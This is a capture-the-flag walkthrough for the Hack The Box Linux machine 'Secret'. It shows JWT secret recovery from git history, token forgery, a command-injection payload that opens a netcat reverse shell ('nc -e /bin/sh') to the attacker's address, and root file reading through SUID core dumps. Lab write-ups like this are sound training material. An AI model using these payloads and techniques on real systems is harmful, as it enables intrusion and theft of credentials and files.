# Hack The Box: Secret

**Difficulty:** Easy
**OS:** Linux

Secret is an Easy-level Linux machine focused on web API security and system misconfigurations. The initial compromise requires analyzing a downloaded Git repository to extract a JWT signing secret, which is then used to forge an administrative token and exploit a command injection vulnerability. Privilege escalation involves abusing a SUID executable designed to generate core dumps, allowing the reading of root-owned files or extracting sensitive information from crash dumps.

---

## Reconnaissance

The assessment begins with an Nmap scan to enumerate open ports on the target machine.

```bash
nmap -p- --min-rate 10000 10.10.11.120
nmap -p 22,80,3000 -sCV 10.10.11.120
```

The scan reveals the following services:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (nginx 1.18.0)
*   **Port 3000:** HTTP (Node.js Express middleware)

Port 80 and port 3000 appear to serve the same content, indicating that NGINX on port 80 acts as a reverse proxy for the Node.js application running on port 3000.

## Web Application Analysis

Navigating to port 80 displays an API documentation website named "DUMB Docs". The documentation describes several endpoints for user registration, login, and administrative tasks. Crucially, the site provides a link to download its own source code (`/download/files.zip`).

### Analyzing the Source Code

We download and extract the `files.zip` archive. Reviewing the source code (specifically the Node.js Express setup) provides immediate insights into the application's authentication and routing logic.

1.  **Authentication:** The application uses JSON Web Tokens (JWT) for authentication.
2.  **Git Repository:** The downloaded source code is a complete Git repository (`.git` folder included).

We examine the Git commit history using `git log` and `git diff` to identify sensitive changes or removed files.

```bash
git log -p
```

The commit history reveals a `.env` file that was accidentally committed and later removed. This file contains the `TOKEN_SECRET` used to sign the JWTs.

```text
TOKEN_SECRET=gXr67TtoQL8TShUc8KNsKP4llEI1gqmacsgZ
```

### Forging an Admin Token

With the JWT signing secret obtained, we can forge a valid authentication token. 

First, we register a standard user account according to the API documentation.
```bash
curl -d '{"name":"testuser","email":"test@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json'
```

Next, we authenticate to receive a valid JWT for our user.
```bash
curl -d '{"email":"test@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/login -H 'Content-Type: application/json'
```

We copy the received JWT and decode its payload (e.g., using `jwt.io`). We modify the `name` field to an administrative user (the source code analysis reveals the admin username is `theadmin`) and resign the token using the recovered `TOKEN_SECRET`.

## Command Injection & Initial Access

The source code reveals a private API endpoint (`/api/logs`) that is only accessible to users with the name `theadmin`.

```javascript
// Snippet from routes/private.js
router.get('/logs', verify, (req, res) => {
    if (req.user.name === 'theadmin') {
        const file = req.query.file;
        // ... insecure execution logic ...
    }
});
```

This endpoint takes a `file` parameter and passes it insecurely to an OS command execution function (like `child_process.exec`).

We use our forged administrative JWT to send a request to this endpoint, appending a command injection payload to the `file` parameter.

```bash
curl http://10.10.11.120/api/logs?file=;nc%20-e%20/bin/sh%2010.10.14.X%209999 -H "auth-token: <FORGED_JWT>"
```

The server executes the payload, and we catch a reverse shell on our Netcat listener.

```bash
nc -lnvp 9999
# Connection received
id
# uid=1000(dasith) gid=1000(dasith)
```
We read the `user.txt` flag from the home directory.

## Privilege Escalation

Enumerating the file system for SUID binaries reveals an unusual executable.

```bash
find / -perm -4000 2>/dev/null
```

Among standard binaries, we find `/opt/count` (or a similarly named custom binary) which has the SUID bit set.

Analyzing this binary locally (using `ltrace`, `strace`, or `ghidra`) reveals that it opens a file provided as an argument and performs operations on it. However, if the program crashes while reading a file, the system's crash dump mechanism (Apport on Ubuntu) will generate a core dump.

### Exploiting Core Dumps

Because the binary is SUID root, it can read files that the standard user `dasith` cannot (such as `/root/root.txt` or `/etc/shadow`).

We can force the binary to crash while it is reading a protected file. Linux core dumps contain the memory state of the program at the time of the crash.

1.  We instruct the SUID binary to read the root flag: `/opt/count /root/root.txt`.
2.  We intentionally cause a segmentation fault or crash (e.g., by providing malformed secondary input if required, or interrupting it in a specific way).
3.  The system generates a crash dump in `/var/crash/`.

We navigate to `/var/crash/` and locate the generated `.crash` file. We unpack the crash file to extract the `CoreDump`.

```bash
apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash_extract
```

Finally, we use `strings` on the extracted core dump to search for the contents of the file that was loaded into memory at the time of the crash.

```bash
strings /tmp/crash_extract/CoreDump | grep -i "HTB{"
```

The command successfully extracts the `root.txt` flag from the core dump.
